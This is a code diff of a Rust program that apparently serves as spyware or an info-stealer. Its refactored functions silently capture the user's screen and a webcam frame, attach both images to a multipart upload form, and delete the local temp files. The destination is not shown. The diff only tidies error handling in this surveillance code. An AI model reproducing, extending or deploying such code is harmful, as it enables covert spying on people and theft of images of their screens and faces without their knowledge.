@@ -10,35 +10,38 @@ use reqwest::blocking::multipart;
 use screenshots::Screen;
 use std::{fs, path::PathBuf};
 
-fn capture_screenshot(save_path: &PathBuf) -> Result<bool, Box<dyn std::error::Error>> {
-    let screens = Screen::all();
+fn capture_screenshot(save_path: &PathBuf) -> bool {
+    if let Some(screens) = Screen::all() {
+        if screens.len() == 0 {
+            return false;
+        }
 
-    if screens.len() > 0 {
         match screens[0].capture() {
             Some(image) => {
                 let buffer = image.buffer();
                 fs::write(&save_path, &buffer).unwrap();
-                return Ok(true);
             }
-            None => (),
+            None => return false,
         };
     }
-    return Ok(false);
+
+    true
 }
 
-fn capture_webcam_image(save_path: &PathBuf) -> Result<bool, Box<dyn std::error::Error>> {
+fn capture_webcam_image(save_path: &PathBuf) -> bool {
     let cameras = query_devices(CaptureAPIBackend::Auto).unwrap();
 
-    if cameras.len() > 0 {
-        let mut camera = Camera::new(0, None).unwrap();
-        camera.open_stream().unwrap();
-
-        fs::write(&save_path, camera.frame_raw().unwrap()).unwrap();
-        camera.stop_stream().unwrap();
-
-        return Ok(true);
+    if cameras.len() == 0 {
+        return false;
     }
-    return Ok(false);
+
+    let mut camera = Camera::new(0, None).unwrap();
+    camera.open_stream().unwrap();
+
+    fs::write(&save_path, camera.frame_raw().unwrap()).unwrap();
+    camera.stop_stream().unwrap();
+
+    true
 }
 
 fn main() {
@@ -130,7 +133,7 @@ fn main() {
         // Adds the screenshot to the request if it succeeds
         let screenshot_temp_path = temp_env.join("screenshot.png");
 
-        if capture_screenshot(&screenshot_temp_path).unwrap() {
+        if capture_screenshot(&screenshot_temp_path) {
             form = form.file("screenshot", &screenshot_temp_path).unwrap();
             fs::remove_file(screenshot_temp_path).unwrap();
         }
@@ -140,7 +143,7 @@ fn main() {
         // Adds the webcam image to the request if it succeeds
         let webcam_temp_path = temp_env.join("webcam.png");
 
-        if capture_webcam_image(&webcam_temp_path).unwrap() {
+        if capture_webcam_image(&webcam_temp_path) {
             form = form.file("webcam", &webcam_temp_path).unwrap();
             fs::remove_file(webcam_temp_path).unwrap();
         }
